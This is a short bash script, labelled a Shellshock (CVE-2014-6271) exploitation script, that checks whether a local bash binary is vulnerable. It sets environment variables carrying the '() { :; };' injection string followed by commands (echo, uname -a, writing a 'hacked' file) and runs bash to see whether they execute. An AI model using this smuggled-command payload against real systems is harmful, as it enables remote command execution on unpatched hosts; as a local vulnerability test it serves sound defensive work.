#!/bin/bash
# Shellshock CVE-2014-6271 Exploitation Script

BASH_BIN=${1:-/bin/bash}

$BASH_BIN --version | head -1
env x1='() { :; }; echo VULNERABLE' $BASH_BIN -c 'echo Test 1'

env x2='() { :; }; uname -a' $BASH_BIN -c 'echo Test 2'

env x3='() { :; }; touch ./shellshock_poc; echo hacked > ./shellshock_poc' $BASH_BIN -c 'echo Can you see a ./shellshock_poc?'